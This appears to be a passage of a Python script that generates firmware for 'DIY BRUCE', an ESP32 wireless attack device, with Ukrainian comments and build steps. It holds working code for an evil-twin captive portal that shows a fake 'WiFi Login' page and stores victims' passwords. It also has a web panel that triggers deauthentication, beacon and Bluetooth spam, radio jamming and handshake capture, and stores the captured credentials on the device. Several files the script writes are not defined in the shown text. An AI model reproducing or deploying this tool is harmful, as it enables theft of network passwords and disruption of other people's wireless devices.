# Storage.h
STORAGE_H = '''#ifndef STORAGE_H
#define STORAGE_H

#include <Arduino.h>
#include <EEPROM.h>

void savePasswordsToEEPROM();
void loadPasswordsFromEEPROM();
void formatStorage();

#endif
'''

STORAGE_CPP = '''#include "Storage.h"
#include <U8g2lib.h>

extern String capturedPasswords;
extern String handshakes;
extern void showMsg(const char* msg, int delayMs = 1500);

void savePasswordsToEEPROM() {
  EEPROM.begin(4096);
  String allData = "PASSWORDS:\\n" + capturedPasswords + "\\nHANDSHAKES:\\n" + handshakes;
  for (int i = 0; i < allData.length() && i < 4096; i++) EEPROM.write(i, allData[i]);
  EEPROM.write(allData.length(), 0);
  EEPROM.commit();
}

void loadPasswordsFromEEPROM() {
  EEPROM.begin(4096);
  String loaded = "";
  for (int i = 0; i < 4096; i++) { char c = char(EEPROM.read(i)); if (c == 0) break; loaded += c; }
  int passIdx = loaded.indexOf("PASSWORDS:\\n");
  int handIdx = loaded.indexOf("HANDSHAKES:\\n");
  if (passIdx != -1) capturedPasswords = loaded.substring(passIdx + 11, handIdx);
  if (handIdx != -1) handshakes = loaded.substring(handIdx + 11);
}

void formatStorage() {
  EEPROM.begin(4096);
  for (int i = 0; i < 4096; i++) EEPROM.write(i, 0);
  EEPROM.commit();
  capturedPasswords = "";
  handshakes = "";
  showMsg("FORMATTED!");
}
'''

# WebServer.h
WEB_H = '''#ifndef WEBSERVER_H
#define WEBSERVER_H

#include <Arduino.h>
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>

void startEvilTwinPortal();
void stopEvilTwinPortal();
void startWebServer();
void stopWebServer();
void handleRoot();
void handleData();
void handleCmd();

#endif
'''

WEB_CPP = '''#include "WebServer.h"
#include <U8g2lib.h>

extern WebServer server;
extern DNSServer dnsServer;
extern bool webRunning;
extern int deauthPackets, beaconPackets, lastRSSI;
extern String capturedPasswords, handshakes;
extern void scanWiFi();
extern void startWiFiDeauth();
extern void startWiFiBeacon();
extern void startHandshakeSniffer();
extern void scanBLE();
extern void startBLEAppleJuice();
extern void startBLESamsung();
extern void startBLEAndroid();
extern void startBLEWindows();
extern void startBLESpamAll();
extern void startBLEJammer();
extern void startNRFJammer();
extern void stopNRFAttack();
extern void savePasswordsToEEPROM();
extern void stopEvilTwin();
extern void rebootDevice();

const char* evilPage = R"rawliteral(<!DOCTYPE html><html><head><title>WiFi Login</title><style>body{background:#f0f2f5;text-align:center;padding:20px;}input{width:300px;padding:10px;margin:10px;}</style></head><body><div><h2>WiFi Login</h2><form action="/pass" method="POST"><input type="password" name="p" placeholder="Password"><button type="submit">Connect</button></form></div></body></html>)rawliteral";
const char* adminPage = R"rawliteral(<!DOCTYPE html><html><head><title>DIY BRUCE</title><meta name="viewport" content="width=device-width,initial-scale=1"><style>body{background:#0a0a1a;color:#fff;font-family:sans-serif;padding:16px;}button{background:#ff6b35;border:none;padding:10px;margin:5px;border-radius:20px;color:#fff;}</style></head><body><h1>DIY BRUCE</h1><div><button onclick="fetch('/cmd?c=scan')">SCAN</button><button onclick="fetch('/cmd?c=deauth_start')">DEAUTH</button><button onclick="fetch('/cmd?c=beacon_start')">BEACON</button><button onclick="fetch('/cmd?c=evil')">EVIL</button><button onclick="fetch('/cmd?c=handshake')">HANDSHAKE</button><button onclick="fetch('/cmd?c=view_pass')">PASS</button><button onclick="fetch('/cmd?c=reset')">RESET</button></div><pre id="log"></pre><script>function fetch(url){fetch(url).then(r=>r.text()).then(t=>document.getElementById('log').innerText+=t+"\\n");}</script></body></html>)rawliteral";

WebServer server(80);
DNSServer dnsServer;
bool webRunning = false;

void handleRoot() { server.send(200, "text/html", adminPage); }
void handleData() {
  String json = "{\\"deauth\\":" + String(deauthPackets) + ",\\"beacon\\":" + String(beaconPackets) + ",\\"rssi\\":" + String(lastRSSI) + ",\\"batt\\":67}";
  server.send(200, "application/json", json);
}

void handleCmd() {
  if (!server.hasArg("c")) { server.send(200, "text/plain", "NO CMD"); return; }
  String cmd = server.arg("c");
  if (cmd == "scan") { scanWiFi(); server.send(200, "text/plain", "SCAN OK\\n"); }
  else if (cmd == "deauth_start") { startWiFiDeauth(); server.send(200, "text/plain", "DEAUTH START\\n"); }
  else if (cmd == "deauth_stop") { deauthActive = false; server.send(200, "text/plain", "DEAUTH STOP\\n"); }
  else if (cmd == "beacon_start") { startWiFiBeacon(); server.send(200, "text/plain", "BEACON START\\n"); }
  else if (cmd == "beacon_stop") { beaconActive = false; server.send(200, "text/plain", "BEACON STOP\\n"); }
  else if (cmd == "evil") { startEvilTwinPortal(); server.send(200, "text/plain", "EVIL START\\n"); }
  else if (cmd == "evil_stop") { stopEvilTwin(); server.send(200, "text/plain", "EVIL STOP\\n"); }
  else if (cmd == "handshake") { startHandshakeSniffer(); server.send(200, "text/plain", "HANDSHAKE\\n"); }
  else if (cmd == "ble_scan") { scanBLE(); server.send(200, "text/plain", "BLE SCAN\\n"); }
  else if (cmd == "ble_apple") { startBLEAppleJuice(); server.send(200, "text/plain", "BLE APPLE\\n"); }
  else if (cmd == "ble_samsung") { startBLESamsung(); server.send(200, "text/plain", "BLE SAMSUNG\\n"); }
  else if (cmd == "ble_android") { startBLEAndroid(); server.send(200, "text/plain", "BLE ANDROID\\n"); }
  else if (cmd == "ble_windows") { startBLEWindows(); server.send(200, "text/plain", "BLE WINDOWS\\n"); }
  else if (cmd == "ble_all") { startBLESpamAll(); server.send(200, "text/plain", "BLE ALL\\n"); }
  else if (cmd == "ble_jam") { startBLEJammer(); server.send(200, "text/plain", "BLE JAM\\n"); }
  else if (cmd == "nrf_jam") { startNRFJammer(); server.send(200, "text/plain", "NRF JAM\\n"); }
  else if (cmd == "nrf_stop") { stopNRFAttack(); server.send(200, "text/plain", "NRF STOP\\n"); }
  else if (cmd == "view_pass") { server.send(200, "text/plain", capturedPasswords.length() ? capturedPasswords : "NO PASSWORDS\\n"); }
  else if (cmd == "view_hand") { server.send(200, "text/plain", handshakes.length() ? handshakes : "NO HANDSHAKES\\n"); }
  else if (cmd == "clear_pass") { capturedPasswords = ""; handshakes = ""; savePasswordsToEEPROM(); server.send(200, "text/plain", "CLEARED\\n"); }
  else if (cmd == "reset") { server.send(200, "text/plain", "RESET\\n"); delay(100); ESP.restart(); }
  else { server.send(200, "text/plain", "UNKNOWN\\n"); }
}

void startEvilTwinPortal() {
  if(evilActive) return;
  WiFi.softAP("FREE_WIFI", NULL); dnsServer.start(53, "*", WiFi.softAPIP());
  server.on("/", [](){ server.send(200,"text/html",evilPage); });
  server.on("/pass", HTTP_POST, [](){
    String pwd = server.hasArg("p") ? server.arg("p") : "";
    if(pwd.length()>0) capturedPasswords += "[PASS] " + pwd + "\\n";
    savePasswordsToEEPROM();
    server.send(200,"text/html","<html><body><h3>Thanks!</h3><script>setTimeout(function(){window.location.href='/';},2000);</script></body></html>");
  });
  server.on("/cmd", handleCmd);
  server.on("/data", handleData);
  server.begin(); evilActive=true;
  showMsg("EVIL TWIN ACTIVE");
  while(evilActive){
    dnsServer.processNextRequest(); server.handleClient();
    u8g2.clearBuffer(); u8g2.setFont(u8g2_font_helvB08_tr);
    u8g2.drawStr(20,28,"EVIL TWIN"); u8g2.setFont(u8g2_font_6x10_tr);
    u8g2.drawStr(5,45,"FREE_WIFI"); u8g2.drawStr(5,58,"BACK STOP"); u8g2.sendBuffer();
    if(btn(BTN_BACK)){ evilActive=false; }
    delay(100);
  }
  stopEvilTwin();
}
void stopEvilTwinPortal() {
  dnsServer.stop(); server.stop(); WiFi.softAPdisconnect(true);
  server.on("/", handleRoot);
  server.on("/cmd", handleCmd);
  server.on("/data", handleData);
  server.begin(); evilActive=false;
}

void startWebServer() {
  if(!webRunning){
    WiFi.softAP("DIY_BRUCE", "bruce1234");
    server.on("/", handleRoot);
    server.on("/cmd", handleCmd);
    server.on("/data", handleData);
    server.begin();
    dnsServer.start(53, "*", WiFi.softAPIP());
    webRunning=true;
    showMsg("WEB: 192.168.4.1");
  } else showMsg("WEB ALREADY RUNNING");
}
void stopWebServer() {
  if(webRunning){
    dnsServer.stop(); server.stop(); WiFi.softAPdisconnect(true);
    webRunning=false;
    showMsg("WEB STOPPED");
  } else showMsg("WEB NOT RUNNING");
}
'''

# Settings.h (додаткові налаштування)
SETTINGS_H = '''#ifndef SETTINGS_H
#define SETTINGS_H

#include <Arduino.h>

void setBrightness();
void startWebServer();
void stopWebServer();
void showPasswordsList();
void showHandshakesList();
void showAbout();
void rebootDevice();

#endif
'''

SETTINGS_CPP = '''#include "Settings.h"
#include <U8g2lib.h>
#include <EEPROM.h>

extern U8G2_SSD1306_128X64_NONAME_F_HW_I2C u8g2;
extern uint8_t contrast;
extern String capturedPasswords, handshakes;
extern void showMsg(const char* msg, int delayMs = 1500);
extern bool btn(int pin);
#define BTN_BACK 26

void setBrightness() {
  while(true){
    u8g2.clearBuffer(); u8g2.setFont(u8g2_font_6x10_tr);
    u8g2.drawStr(40,10,"Brightness");
    u8g2.drawFrame(8,32,112,12); u8g2.drawBox(8,32,contrast*112/255,12);
    char buf[8]; sprintf(buf,"%d%%",contrast*100/255);
    u8g2.setFont(u8g2_font_6x10_tr); int w=u8g2.getStrWidth(buf);
    u8g2.drawStr((128-w)/2,52,buf);
    u8g2.drawStr(8,30,"<"); u8g2.drawStr(110,30,">");
    u8g2.setFont(u8g2_font_5x7_tr); u8g2.drawStr(2,63,"LR=change  OK=save  BACK");
    u8g2.sendBuffer();
    if(btn(14) && contrast>10) contrast-=10;
    else if(btn(27) && contrast<255) contrast+=10;
    else if(btn(12)){ EEPROM.write(1,contrast); EEPROM.commit(); u8g2.setContrast(contrast); showMsg("SAVED!"); break; }
    else if(btn(BTN_BACK)) break;
    delay(50);
  }
}

void showPasswordsList() { showMsg(capturedPasswords.length() ? capturedPasswords.substring(0, 50).c_str() : "NO PASSWORDS"); }
void showHandshakesList() { showMsg(handshakes.length() ? handshakes.substring(0, 50).c_str() : "NO HANDSHAKES"); }
void showAbout() {
  u8g2.clearBuffer(); u8g2.setFont(u8g2_font_6x10_tr);
  u8g2.drawStr(10,30,"DIY BRUCE v3.0");
  u8g2.drawStr(10,45,"ESP32 Attack Tool");
  u8g2.drawStr(10,58,"WiFi | BLE | NRF | EVIL");
  u8g2.setFont(u8g2_font_5x7_tr); u8g2.drawStr(2,63,"BACK=exit");
  u8g2.sendBuffer(); while(!btn(BTN_BACK)) delay(50);
}
void rebootDevice() { ESP.restart(); }
'''

# Головний файл main.cpp (лише меню, прототипи, виклики модулів)
MAIN_CPP = '''// =============================================
//  DIY BRUCE v3.0 - MODULAR
//  Головний файл – тільки меню та навігація
//  Усі функції знаходяться в папці lib/
// =============================================

#include <U8g2lib.h>
#include <Wire.h>
#include <EEPROM.h>
#include "icons.h"

// ==================== ПІНИ ====================
#define BTN_UP     15
#define BTN_DOWN   13
#define BTN_OK     12
#define BTN_LEFT   14
#define BTN_RIGHT  27
#define BTN_BACK   26

// ==================== OLED ====================
U8G2_SSD1306_128X64_NONAME_F_HW_I2C u8g2(U8G2_R0, U8X8_PIN_NONE, 22, 21);

// ==================== ГЛОБАЛЬНІ ЗМІННІ ====================
uint8_t contrast = 200;

// ==================== ПРОТОТИПИ МОДУЛІВ ====================
// WiFi
void scanWiFi();
void startWiFiDeauth();
void startWiFiBeacon();
void startEvilTwin();
void stopEvilTwin();
void startWiFiJammer();
void startHandshakeSniffer();
void startWiFiMonitor();
void startWiFiInfo();
void saveWiFiPasswords();
void showWiFiPasswords();
void clearWiFiPasswords();
void setWiFiChannel();
void stopWiFiAttack();

// BLE
void scanBLE();
void startBLEAppleJuice();
void startBLESamsung();
void startBLEAndroid();
void startBLEWindows();
void startBLESpamAll();
void startBLEJammer();
void startBLEInfo();
void stopBLEAttack();

// NRF24
void scanNRF();
void startNRFJammer();
void startNRFSend();
void startNRFInfo();
void setNRFChannel();
void stopNRFAttack();

// Налаштування
void setBrightness();
void startWebServer();
void stopWebServer();
void showPasswordsList();
void showHandshakesList();
void formatStorage();
void showAbout();
void rebootDevice();

// Сервісні
void drawTopBar();
void drawMainMenu();
void drawSubMenu(const char* title, const char* items[], int size, int selected);
void showMsg(const char* msg, int delayMs = 1500);
void drawFtr(const char* t);
void savePasswordsToEEPROM();
void loadPasswordsFromEEPROM();
bool btn(int pin);

// ==================== МЕНЮ ====================
struct MenuItem { const char* name; const unsigned char* icon; };
MenuItem modules[] = {
  { "WiFi",     wifi_bits     },
  { "BLE",      ble_bits      },
  { "NRF24",    nrf_bits      },
  { "Settings", settings_bits }
};
const int MODULE_COUNT = 4;
int moduleIdx = 0;

const char* wifiSub[] = {"SCAN", "DEAUTH", "BEACON", "EVIL", "HANDSHAKE", "JAM", "MONITOR", "INFO", "SAVE PASS", "SHOW PASS", "CLEAR PASS", "SET CH", "STOP", "REBOOT"};
const int WIFI_SIZE = 14;
const char* bleSub[] = {"SCAN", "APPLEJUICE", "SAMSUNG", "ANDROID", "WINDOWS", "SPAM ALL", "JAM", "INFO", "STOP", "REBOOT"};
const int BLE_SIZE = 10;
const char* nrfSub[] = {"SCAN", "JAM", "SEND", "INFO", "SET CH", "STOP", "REBOOT"};
const int NRF_SIZE = 7;
const char* settSub[] = {"BRIGHT", "WEB ON", "WEB OFF", "SHOW PASS", "SHOW HANDSHAKE", "FORMAT", "INFO", "REBOOT"};
const int SETT_SIZE = 8;

int subIdx = 0;
enum State { S_MENU, S_SUBMENU };
State curState = S_MENU;

// ==================== UI ФУНКЦІЇ ====================
void drawTopBar() {
  char buf[10]; int s = (millis()/1000)%60, m = (millis()/60000)%60, h = (millis()/3600000)%24;
  snprintf(buf, sizeof(buf), "%02d:%02d:%02d", h, m, s);
  u8g2.setFont(u8g2_font_6x13_tr); u8g2.drawStr(2, 9, buf);
  u8g2.drawFrame(114, 1, 12, 6); u8g2.drawBox(126, 3, 2, 2); u8g2.drawBox(115, 2, 9, 4);
  u8g2.setCursor(55, 9); u8g2.print("67%");
  u8g2.setCursor(110, 9); u8g2.print("-50dB");
  u8g2.drawLine(0, 10, 128, 10);
}

void drawMainMenu() {
  u8g2.clearBuffer(); drawTopBar();
  u8g2.drawXBM(48, 16, 32, 32, modules[moduleIdx].icon);
  u8g2.setFont(u8g2_font_9x15B_tr); u8g2.drawStr(4, 36, "<"); u8g2.drawStr(114, 36, ">");
  u8g2.setFont(u8g2_font_7x13B_tr); int nw = u8g2.getStrWidth(modules[moduleIdx].name);
  u8g2.drawStr((128 - nw) / 2, 58, modules[moduleIdx].name);
  int dotX = (128 - MODULE_COUNT * 8) / 2;
  for (int i = 0; i < MODULE_COUNT; i++) {
    if (i == moduleIdx) u8g2.drawBox(dotX + i * 8, 55, 5, 5);
    else u8g2.drawFrame(dotX + i * 8, 55, 5, 5);
  }
  u8g2.sendBuffer();
}

void drawSubMenu(const char* title, const char* items[], int size, int selected) {
  u8g2.clearBuffer(); drawTopBar();
  u8g2.drawBox(0, 0, 128, 12); u8g2.setDrawColor(0);
  u8g2.setFont(u8g2_font_6x10_tr); int w = u8g2.getStrWidth(title);
  u8g2.drawStr((128 - w) / 2, 10, title); u8g2.setDrawColor(1); u8g2.drawHLine(0, 12, 128);
  for (int i = 0; i < size; i++) {
    int y = 24 + i * 10;
    if (i == selected) {
      u8g2.drawBox(0, y - 8, 128, 10); u8g2.setDrawColor(0);
      u8g2.drawStr(14, y, items[i]); u8g2.setDrawColor(1);
    } else { u8g2.drawStr(14, y, items[i]); }
  }
  u8g2.drawHLine(0, 55, 128); u8g2.setFont(u8g2_font_5x7_tr);
  u8g2.drawStr(2, 63, "UP/DN=sel OK=enter BACK=exit"); u8g2.sendBuffer();
}

void showMsg(const char* msg, int delayMs) {
  u8g2.clearBuffer(); drawTopBar(); u8g2.setFont(u8g2_font_6x10_tr);
  u8g2.drawStr(10, 35, msg); u8g2.sendBuffer(); delay(delayMs);
}
void drawFtr(const char* t) { u8g2.drawHLine(0,55,128); u8g2.setFont(u8g2_font_5x7_tr); u8g2.drawStr(2,63,t); }

// ==================== ДЕБАУНС ====================
unsigned long lastBtn = 0;
#define DEBOUNCE 200
bool btn(int pin) { if (!digitalRead(pin) && millis() - lastBtn > DEBOUNCE) { lastBtn = millis(); return true; } return false; }

// ==================== НАВІГАЦІЯ ====================
void goBack() { curState = S_MENU; drawMainMenu(); }
void enterAction() {
  switch (moduleIdx) {
    case 0:
      switch(subIdx){
        case 0: scanWiFi(); goBack(); break;
        case 1: startWiFiDeauth(); goBack(); break;
        case 2: startWiFiBeacon(); goBack(); break;
        case 3: startEvilTwin(); goBack(); break;
        case 4: startHandshakeSniffer(); goBack(); break;
        case 5: startWiFiJammer(); goBack(); break;
        case 6: startWiFiMonitor(); goBack(); break;
        case 7: startWiFiInfo(); goBack(); break;
        case 8: saveWiFiPasswords(); goBack(); break;
        case 9: showWiFiPasswords(); goBack(); break;
        case 10: clearWiFiPasswords(); goBack(); break;
        case 11: setWiFiChannel(); goBack(); break;
        case 12: stopWiFiAttack(); goBack(); break;
        case 13: rebootDevice(); break;
      } break;
    case 1:
      switch(subIdx){
        case 0: scanBLE(); goBack(); break;
        case 1: startBLEAppleJuice(); goBack(); break;
        case 2: startBLESamsung(); goBack(); break;
        case 3: startBLEAndroid(); goBack(); break;
        case 4: startBLEWindows(); goBack(); break;
        case 5: startBLESpamAll(); goBack(); break;
        case 6: startBLEJammer(); goBack(); break;
        case 7: startBLEInfo(); goBack(); break;
        case 8: stopBLEAttack(); goBack(); break;
        case 9: rebootDevice(); break;
      } break;
    case 2:
      switch(subIdx){
        case 0: scanNRF(); goBack(); break;
        case 1: startNRFJammer(); goBack(); break;
        case 2: startNRFSend(); goBack(); break;
        case 3: startNRFInfo(); goBack(); break;
        case 4: setNRFChannel(); goBack(); break;
        case 5: stopNRFAttack(); goBack(); break;
        case 6: rebootDevice(); break;
      } break;
    case 3:
      switch(subIdx){
        case 0: setBrightness(); goBack(); break;
        case 1: startWebServer(); goBack(); break;
        case 2: stopWebServer(); goBack(); break;
        case 3: showPasswordsList(); goBack(); break;
        case 4: showHandshakesList(); goBack(); break;
        case 5: formatStorage(); goBack(); break;
        case 6: showAbout(); goBack(); break;
        case 7: rebootDevice(); break;
      } break;
  }
}
void loopMain() {
  if (btn(BTN_LEFT)) { moduleIdx = (moduleIdx - 1 + MODULE_COUNT) % MODULE_COUNT; drawMainMenu(); }
  else if (btn(BTN_RIGHT)) { moduleIdx = (moduleIdx + 1) % MODULE_COUNT; drawMainMenu(); }
  else if (btn(BTN_OK) || btn(BTN_DOWN)) { curState = S_SUBMENU; subIdx = 0; const char** items = moduleIdx==0?wifiSub:(moduleIdx==1?bleSub:(moduleIdx==2?nrfSub:settSub)); int size = moduleIdx==0?WIFI_SIZE:(moduleIdx==1?BLE_SIZE:(moduleIdx==2?NRF_SIZE:SETT_SIZE)); drawSubMenu(modules[moduleIdx].name, items, size, subIdx); }
}
void loopSub() {
  int size = moduleIdx==0?WIFI_SIZE:(moduleIdx==1?BLE_SIZE:(moduleIdx==2?NRF_SIZE:SETT_SIZE));
  const char** items = moduleIdx==0?wifiSub:(moduleIdx==1?bleSub:(moduleIdx==2?nrfSub:settSub));
  if (btn(BTN_UP)) { subIdx = (subIdx - 1 + size) % size; drawSubMenu(modules[moduleIdx].name, items, size, subIdx); }
  else if (btn(BTN_DOWN)) { subIdx = (subIdx + 1) % size; drawSubMenu(modules[moduleIdx].name, items, size, subIdx); }
  else if (btn(BTN_OK)) { enterAction(); }
  else if (btn(BTN_BACK)) { curState = S_MENU; drawMainMenu(); }
}

// ==================== SETUP ====================
void setup() {
  pinMode(BTN_UP, INPUT_PULLUP); pinMode(BTN_DOWN, INPUT_PULLUP); pinMode(BTN_OK, INPUT_PULLUP);
  pinMode(BTN_LEFT, INPUT_PULLUP); pinMode(BTN_RIGHT, INPUT_PULLUP); pinMode(BTN_BACK, INPUT_PULLUP);
  EEPROM.begin(32); uint8_t nrfCh = EEPROM.read(0); // не використовується в main, але читаємо для сумісності
  contrast = EEPROM.read(1); if (contrast < 10) contrast = 200;
  Wire.begin(21, 22); u8g2.begin(); u8g2.setContrast(contrast);
  loadPasswordsFromEEPROM();
  for (int x = 128; x >= 0; x -= 8) {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_logisoso24_tr);
    u8g2.drawStr(x + 4, 32, "DIY");
    u8g2.setFont(u8g2_font_7x13B_tr);
    u8g2.drawStr(x + 4, 48, "BRUCE");
    u8g2.sendBuffer();
    delay(10);
  }
  delay(500);
  curState = S_MENU; drawMainMenu();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
  esp_wifi_set_promiscuous_rx_cb(&handshakeSniffer);
}
void loop() {
  if (webRunning) {
    dnsServer.processNextRequest();
    server.handleClient();
  }
  switch (curState) {
    case S_MENU: loopMain(); break;
    case S_SUBMENU: loopSub(); break;
  }
  delay(20);
}
'''

# ------------------------------------------------------------
#  СТВОРЕННЯ ПРОЕКТУ
# ------------------------------------------------------------
def create_project():
    base = "DIY_BRUCE_MODULAR"
    if os.path.exists(base):
        shutil.rmtree(base)
    os.makedirs(os.path.join(base, "src"))
    os.makedirs(os.path.join(base, "include"))
    os.makedirs(os.path.join(base, "data"))
    os.makedirs(os.path.join(base, "lib", "WiFiAttack"))
    os.makedirs(os.path.join(base, "lib", "BLEAttack"))
    os.makedirs(os.path.join(base, "lib", "NRF24Attack"))
    os.makedirs(os.path.join(base, "lib", "IRAttack"))
    os.makedirs(os.path.join(base, "lib", "WebServer"))
    os.makedirs(os.path.join(base, "lib", "Storage"))
    os.makedirs(os.path.join(base, "lib", "Settings"))

    with open(os.path.join(base, "platformio.ini"), "w") as f:
        f.write(PLATFORMIO_INI)
    with open(os.path.join(base, "custom_4Mb.csv"), "w") as f:
        f.write(CUSTOM_PARTITIONS)
    with open(os.path.join(base, "include", "icons.h"), "w") as f:
        f.write(ICONS_H)
    with open(os.path.join(base, "data", "index.html"), "w") as f:
        f.write(INDEX_HTML)
    with open(os.path.join(base, "src", "main.cpp"), "w") as f:
        f.write(MAIN_CPP)
    with open(os.path.join(base, "lib", "WiFiAttack", "WiFiAttack.h"), "w") as f:
        f.write(WIFI_H)
    with open(os.path.join(base, "lib", "WiFiAttack", "WiFiAttack.cpp"), "w") as f:
        f.write(WIFI_CPP)
    with open(os.path.join(base, "lib", "BLEAttack", "BLEAttack.h"), "w") as f:
        f.write(BLE_H)
    with open(os.path.join(base, "lib", "BLEAttack", "BLEAttack.cpp"), "w") as f:
        f.write(BLE_CPP)
    with open(os.path.join(base, "lib", "NRF24Attack", "NRF24Attack.h"), "w") as f:
        f.write(NRF_H)
    with open(os.path.join(base, "lib", "NRF24Attack", "NRF24Attack.cpp"), "w") as f:
        f.write(NRF_CPP)
    with open(os.path.join(base, "lib", "IRAttack", "IRAttack.h"), "w") as f:
        f.write(IR_H)
    with open(os.path.join(base, "lib", "IRAttack", "IRAttack.cpp"), "w") as f:
        f.write(IR_CPP)
    with open(os.path.join(base, "lib", "WebServer", "WebServer.h"), "w") as f:
        f.write(WEB_H)
    with open(os.path.join(base, "lib", "WebServer", "WebServer.cpp"), "w") as f:
        f.write(WEB_CPP)
    with open(os.path.join(base, "lib", "Storage", "Storage.h"), "w") as f:
        f.write(STORAGE_H)
    with open(os.path.join(base, "lib", "Storage", "Storage.cpp"), "w") as f:
        f.write(STORAGE_CPP)
    with open(os.path.join(base, "lib", "Settings", "Settings.h"), "w") as f:
        f.write(SETTINGS_H)
    with open(os.path.join(base, "lib", "Settings", "Settings.cpp"), "w") as f:
        f.write(SETTINGS_CPP)

    print(f"✅ Проект створено в папці {os.path.abspath(base)}")
    print("1. Відкрий папку у VS Code з PlatformIO")
    print("2. Натисни Clean → Build → Upload")
    print("3. Після заливання підключись до WiFi DIY_BRUCE (пароль bruce1234)")
    print("4. Відкрий 192.168.4.1 у браузері – побачиш веб-інтерфейс")

if __name__ == "__main__":
    create_project()
